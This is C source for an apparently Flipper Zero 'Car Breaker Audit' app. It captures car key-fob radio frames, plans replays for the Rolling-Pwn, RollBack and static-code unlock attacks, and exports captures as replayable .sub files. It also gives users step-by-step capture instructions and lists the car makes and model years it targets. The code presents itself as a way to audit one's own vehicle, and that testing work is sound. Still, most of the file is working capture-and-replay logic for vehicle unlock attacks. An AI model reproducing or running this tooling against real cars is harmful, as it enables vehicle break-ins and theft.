#include "car_breaker_audit.h"

#include <storage/storage.h>
#include <toolbox/stream/stream.h>
#include <flipper_format.h>

#include <stdarg.h>
#include <stdio.h>

#define TAG "CarBreakerAudit"

// Frames each test needs before the transmit phase may start. RollingPwn
// follows the published ~10-consecutive-press capture protocol; RollBack
// replays a short burst of previously used codes; StaticCode needs one used
// code plus a settling delay.
#define STATIC_TARGET 1
#define STATIC_MIN 1
#define ROLLBACK_TARGET 5
#define ROLLBACK_MIN 3
#define ROLLING_TARGET 10
#define ROLLING_MIN 5

// Values per RAW_Data line when exporting .sub files (keeps lines short).
#define SUB_RAW_VALUES_PER_LINE 64

static CarBreakerAuditFrame retained[CAR_BREAKER_AUDIT_MAX_FRAMES];
static uint8_t retained_next = 0;
static uint16_t retained_total = 0;
static uint16_t retained_at_begin = 0;

CarBreakerAuditState* car_breaker_audit_alloc(void) {
    CarBreakerAuditState* audit = malloc(sizeof(CarBreakerAuditState));
    furi_check(audit != NULL);
    memset(audit, 0, sizeof(CarBreakerAuditState));
    audit->log = furi_string_alloc();
    return audit;
}

void car_breaker_audit_free(CarBreakerAuditState* audit) {
    if(!audit) return;
    furi_string_free(audit->log);
    free(audit);
}

void car_breaker_audit_begin(CarBreakerAuditState* audit, CarBreakerAuditTest test) {
    furi_assert(audit);
    audit->test = test;
    audit->verdict = CarBreakerAuditVerdictPending;
    audit->replay_count = 0;
    audit->replay_done = 0;
    audit->last_tx_ok = false;
    audit->first_capture_ms = 0;
    audit->last_capture_ms = 0;
    audit->log_exported = false;
    retained_at_begin = retained_total;

    switch(test) {
    case CarBreakerAuditTestStaticCode:
        audit->target_frames = STATIC_TARGET;
        audit->min_frames = STATIC_MIN;
        break;
    case CarBreakerAuditTestRollBack:
        audit->target_frames = ROLLBACK_TARGET;
        audit->min_frames = ROLLBACK_MIN;
        break;
    case CarBreakerAuditTestRollingPwn:
    default:
        audit->target_frames = ROLLING_TARGET;
        audit->min_frames = ROLLING_MIN;
        break;
    }

    furi_string_reset(audit->log);
}

void car_breaker_audit_retain(
    CarBreakerAuditState* audit,
    const uint32_t* signed_durations,
    uint16_t count,
    uint32_t timestamp_ms,
    uint32_t hash,
    uint8_t preset_index) {
    UNUSED(audit);
    if(count == 0 || count > CAR_BREAKER_AUDIT_MAX_PULSES || !signed_durations) {
        return;
    }

    CarBreakerAuditFrame* slot = &retained[retained_next];
    for(uint16_t i = 0; i < count; i++) {
        slot->durations[i] = (int32_t)signed_durations[i];
    }
    slot->count = count;
    slot->timestamp_ms = timestamp_ms;
    slot->hash = hash;
    slot->preset_index = preset_index;
    slot->valid = true;

    retained_next = (retained_next + 1) % CAR_BREAKER_AUDIT_MAX_FRAMES;
    if(retained_total < CAR_BREAKER_AUDIT_MAX_FRAMES) {
        retained_total++;
    }

    if(audit && audit->verdict == CarBreakerAuditVerdictPending && audit->target_frames > 0) {
        if(audit->first_capture_ms == 0) {
            audit->first_capture_ms = timestamp_ms;
        }
        audit->last_capture_ms = timestamp_ms;
    }
}

uint16_t car_breaker_audit_capture_count(const CarBreakerAuditState* audit) {
    if(!audit) return 0;
    return retained_total - retained_at_begin;
}

uint16_t car_breaker_audit_retained_total(const CarBreakerAuditState* audit) {
    UNUSED(audit);
    return retained_total;
}

const CarBreakerAuditFrame* car_breaker_audit_retained_frame(uint16_t index_from_oldest) {
    if(index_from_oldest >= retained_total) {
        return NULL;
    }
    uint8_t ring_index = (uint8_t)((retained_next + CAR_BREAKER_AUDIT_MAX_FRAMES - retained_total +
                                    index_from_oldest) %
                                   CAR_BREAKER_AUDIT_MAX_FRAMES);
    const CarBreakerAuditFrame* frame = &retained[ring_index];
    return frame->valid ? frame : NULL;
}

void car_breaker_audit_build_plan(CarBreakerAuditState* audit) {
    furi_assert(audit);
    audit->replay_count = 0;
    audit->replay_done = 0;

    uint16_t total = retained_total;
    if(total == 0) return;

    // Frame i in capture order: ring position depends on how many wrapped.
    // order[k] is the ring index of the k-th oldest retained frame.
    uint8_t order[CAR_BREAKER_AUDIT_MAX_FRAMES];
    for(uint16_t k = 0; k < total; k++) {
        order[k] = (uint8_t)((retained_next + CAR_BREAKER_AUDIT_MAX_FRAMES - total + k) %
                             CAR_BREAKER_AUDIT_MAX_FRAMES);
    }

    switch(audit->test) {
    case CarBreakerAuditTestStaticCode:
        // One replay of the captured (used) code after the settling delay.
        audit->replay_order[0] = order[total - 1];
        audit->replay_count = 1;
        break;
    case CarBreakerAuditTestRollBack:
        // Consecutive replay of the oldest captured codes triggers the
        // counter resync described in arXiv:2210.11923.
        for(uint8_t i = 0; i < 3 && i < total && i < CAR_BREAKER_AUDIT_MAX_REPLAYS; i++) {
            audit->replay_order[i] = order[i];
            audit->replay_count++;
        }
        break;
    case CarBreakerAuditTestRollingPwn:
    default:
        // Unused consecutive codes, oldest first; the user observes after
        // each single replay and stops at the first reaction.
        for(uint8_t i = 0; i < CAR_BREAKER_AUDIT_MAX_REPLAYS && i < total; i++) {
            audit->replay_order[i] = order[i];
            audit->replay_count++;
        }
        break;
    }
}

const CarBreakerAuditFrame*
    car_breaker_audit_plan_frame(const CarBreakerAuditState* audit, uint8_t idx) {
    if(!audit || idx >= audit->replay_count || idx >= CAR_BREAKER_AUDIT_MAX_REPLAYS) {
        return NULL;
    }
    const CarBreakerAuditFrame* frame = &retained[audit->replay_order[idx]];
    return frame->valid ? frame : NULL;
}

void car_breaker_audit_log(CarBreakerAuditState* audit, const char* fmt, ...) {
    if(!audit || !fmt) return;
    char line[160];
    va_list args;
    va_start(args, fmt);
    vsnprintf(line, sizeof(line), fmt, args);
    va_end(args);
    furi_string_cat_str(audit->log, line);
    furi_string_cat_str(audit->log, "\n");
}

bool car_breaker_audit_export_log(CarBreakerAuditState* audit, uint32_t epoch) {
    furi_assert(audit);

    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, CAR_BREAKER_AUDIT_DIR);

    char path[96];
    snprintf(path, sizeof(path), "%s/%s%lu.txt", CAR_BREAKER_AUDIT_DIR, CAR_BREAKER_AUDIT_LOG_PREFIX, epoch);

    File* file = storage_file_alloc(storage);
    bool ok = false;
    do {
        if(!storage_file_open(file, path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
            FURI_LOG_E(TAG, "Cannot open %s", path);
            break;
        }
        const char* text = furi_string_get_cstr(audit->log);
        if(storage_file_write(file, text, strlen(text)) != strlen(text)) {
            FURI_LOG_E(TAG, "Short write to %s", path);
            break;
        }
        ok = true;
        audit->log_exported = true;
    } while(false);

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    return ok;
}

bool car_breaker_audit_export_sub(
    const CarBreakerAuditFrame* frame,
    uint32_t frequency,
    const uint8_t* regs,
    size_t regs_size,
    const char* path) {
    if(!frame || !frame->valid || !path) return false;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_common_mkdir(storage, CAR_BREAKER_AUDIT_DIR);

    FlipperFormat* ff = flipper_format_file_alloc(storage);
    bool ok = false;
    do {
        if(!flipper_format_file_open_always(ff, path)) break;
        if(!flipper_format_write_header_cstr(ff, "Flipper SubGhz Key File", 1)) break;
        if(!flipper_format_write_uint32(ff, "Frequency", &frequency, 1)) break;
        if(!flipper_format_write_string_cstr(ff, "Preset", "FuriHalSubGhzPresetCustom")) break;
        if(!flipper_format_write_string_cstr(ff, "Custom_preset_module", "CC1101")) break;
        if(!flipper_format_write_hex(ff, "Custom_preset_data", regs, regs_size)) break;

        FuriString* line = furi_string_alloc();
        for(uint16_t start = 0; start < frame->count; start += SUB_RAW_VALUES_PER_LINE) {
            uint16_t end = start + SUB_RAW_VALUES_PER_LINE;
            if(end > frame->count) end = frame->count;
            furi_string_reset(line);
            for(uint16_t i = start; i < end; i++) {
                furi_string_cat_printf(line, "%s%ld", (i == start) ? "" : ", ", frame->durations[i]);
            }
            if(!flipper_format_write_string(ff, "RAW_Data", line)) {
                furi_string_free(line);
                break;
            }
        }
        furi_string_free(line);
        ok = true;
    } while(false);

    flipper_format_free(ff);
    furi_record_close(RECORD_STORAGE);
    return ok;
}

const char* car_breaker_audit_test_name(CarBreakerAuditTest test) {
    switch(test) {
    case CarBreakerAuditTestStaticCode:
        return "Static Code";
    case CarBreakerAuditTestRollBack:
        return "RollBack";
    case CarBreakerAuditTestRollingPwn:
    default:
        return "Rolling-Pwn";
    }
}

const char* car_breaker_audit_test_brief(CarBreakerAuditTest test) {
    switch(test) {
    case CarBreakerAuditTestStaticCode:
        return "Tests for fixed unlock codes\n"
               "(CVE-2022-27254 class).\n"
               "1. Press unlock on the fob\n"
               "   once, near the Flipper.\n"
               "2. Wait 30s (enforced).\n"
               "3. App replays the capture.";
    case CarBreakerAuditTestRollBack:
        return "Tests replay-triggered counter\n"
               "resync (arXiv 2210.11923).\n"
               "1. Use the fob normally 5x\n"
               "   near car and Flipper.\n"
               "2. App replays the oldest\n"
               "   codes consecutively.";
    case CarBreakerAuditTestRollingPwn:
    default:
        return "Tests unused consecutive codes\n"
               "(CVE-2021-46145 class).\n"
               "1. Walk >30m from the car\n"
               "   (or shield the fob).\n"
               "2. Press unlock 10x.\n"
               "3. Return, app replays codes\n"
               "   one at a time.";
    }
}

const char* car_breaker_audit_verdict_name(CarBreakerAuditVerdict verdict) {
    switch(verdict) {
    case CarBreakerAuditVerdictVulnerable:
        return "VULNERABLE";
    case CarBreakerAuditVerdictNotDetected:
        return "NOT DETECTED";
    case CarBreakerAuditVerdictInconclusive:
        return "INCONCLUSIVE";
    case CarBreakerAuditVerdictAborted:
        return "ABORTED";
    case CarBreakerAuditVerdictPending:
    default:
        return "PENDING";
    }
}

static const CarBreakerKnownIssue known_issues[] = {
    {"Honda/Acura 2012-22", "Rolling-Pwn", "Fob accepts rolling codes from a previous counter cycle after resync; ~10 consecutive captures enable unlock replay."},
    {"Honda (2020+, some)", "Static codes", "CVE-2022-27254 class: fixed unlock codes that remain replayable indefinitely."},
    {"Kia (various)", "RollBack", "Replaying previously used codes consecutively resyncs the counter to the past; no jamming needed."},
    {"Mazda (various)", "RollBack", "Same replay-triggered counter rollback mechanism as Kia."},
    {"VW group (<=2016)", "Hitag2 crypto", "Key recovery from 4-8 sniffed signals in about a minute (correlation attack)."},
    {"Mini R56/R60 CAS3", "Hitag2", "Same cipher family as VW-group; this app's entropy and keystream diagnostics apply."},
    {"Tesla S/3/X", "PKES/NFC relay", "Relay attacks against passive entry and phone-as-key, not RF rolling-code replay."},
    {"Many brands", "Telematics APIs", "Web/API unlock flaws (Honda Connected App, SiriusXM connected-vehicle API); not RF-related."},
};

const CarBreakerKnownIssue* car_breaker_audit_known_issue(uint8_t index) {
    if(index >= COUNT_OF(known_issues)) return NULL;
    return &known_issues[index];
}

uint8_t car_breaker_audit_known_issue_count(void) {
    return COUNT_OF(known_issues);
}
